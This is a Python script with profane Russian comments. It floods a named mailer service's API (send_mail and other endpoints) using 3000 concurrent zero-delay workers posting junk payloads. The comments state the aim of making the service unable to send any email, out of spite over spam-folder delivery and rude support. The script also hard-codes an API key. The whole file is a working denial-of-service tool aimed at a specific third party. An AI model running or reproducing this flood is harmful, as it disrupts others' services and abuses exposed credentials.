
#опять уебало письмо в спам? сапорт общается как ебанный накуренный хуесос? не проблема! 
#запустить 5 копий файла и больше эта хуита не отправить ни1 письмо 

import asyncio
import aiohttp
import json
import signal
import time
from datetime import datetime
from pathlib import Path
from uuid import uuid4
import random

BASE_URL = "https://mailer.hype-interface.com"
API_KEY = "b01f29d75cc4a74a9a55ff02ce5adb78"
TEMPLATE = "20"             
CONCURRENCY = 3000           
DELAY_SECONDS = 0           
PER_REQUEST_TIMEOUT = 0
MAX_SNIPPET = 5000


endpoints = [
    {"path": "/index", "method": "GET", "summary": "Проверка работоспособности сервиса"},
    {"path": "/api/v2/send_mail", "method": "GET", "summary": "Отправка письма"},
    {"path": "/api/v2/get_services", "method": "GET", "summary": "Получение списка сервисов"},
    {"path": "/index", "method": "POST", "summary": "Проверка работоспособности сервиса"},
    {"path": "/api/v2/send_mail", "method": "POST", "summary": "Отправка письма"},
    {"path": "/api/v2/get_services", "method": "POST", "summary": "Получение списка сервисов"}
]



stop_event = asyncio.Event()

def _on_signal(signame):
    print(f"\n[{datetime.utcnow().isoformat()}] Получен сигнал {signame}. Завершаюсь...")
    stop_event.set()

for s in ("SIGINT", "SIGTERM"):
    try:
        signum = getattr(signal, s)
        signal.signal(signum, lambda sig, frame, s=s: _on_signal(s))
    except Exception:
        pass

def make_payload():

    uid = random.randint(100000, 999999)
    return {
        "api_key": API_KEY,
        "title": f"че за хуйня  {uid}",
        "price": str(random.randint(1, 9999)),
        "name": f"бембембембем_{uid}",
        "photo": "",
        "url": f"https://ETSYSUPER283284742.com/product/{uuid4()}",
        "email": f"RICH+RICK+AHAHAHA+!@*$&$!@&$@!+{uid}@example.com",
        "country_code": "AU",
        "service_code": "gumtree",
        "template": TEMPLATE,
        "user_id": uid
    }

async def send_once(session, endpoint):
    url = BASE_URL.rstrip("/") + endpoint["path"]
    entry = {
        "timestamp": datetime.utcnow().isoformat() + "Z",
        "url": url,
        "method": endpoint["method"],
        "status": None,
        "response_text_snippet": None,
        "error": None,
        "elapsed": None
    }
    start = time.time()
    try:
        if endpoint["method"].upper() == "GET":
            async with session.get(url, timeout=PER_REQUEST_TIMEOUT) as resp:
                text = await resp.text()
                entry["status"] = resp.status
                entry["response_text_snippet"] = text[:MAX_SNIPPET]
        elif endpoint["method"].upper() == "POST":
            payload = make_payload()
            async with session.post(url, json=payload, timeout=PER_REQUEST_TIMEOUT) as resp:
                text = await resp.text()
                entry["status"] = resp.status
                entry["response_text_snippet"] = text[:MAX_SNIPPET]
        else:
            entry["error"] = f"Unsupported method: {endpoint['method']}"
    except Exception as e:
        entry["error"] = repr(e)
    finally:
        entry["elapsed"] = round(time.time() - start, 3)
    return entry

async def worker(worker_id, session):
    iteration = 0
    while not stop_event.is_set():
        iteration += 1
        for ep in endpoints:
            entry = await send_once(session, ep)
            snippet = entry.get("response_text_snippet") or entry.get("error")
            print(f"[{entry['timestamp']}] worker#{worker_id} iter#{iteration} {ep['method']} {ep['path']} -> "
                  f"{entry.get('status') or 'ERR'} | ")
        try:
            await asyncio.wait_for(stop_event.wait(), timeout=DELAY_SECONDS)
            break
        except asyncio.TimeoutError:
            continue


async def main():
    connector = aiohttp.TCPConnector(limit_per_host=CONCURRENCY, ssl=False)
    timeout = aiohttp.ClientTimeout(total=None)
    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
        tasks = [asyncio.create_task(worker(i+1, session)) for i in range(CONCURRENCY)]

        await asyncio.gather(*tasks, return_exceptions=True)


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\nKeyboardInterrupt — завершаюсь.")
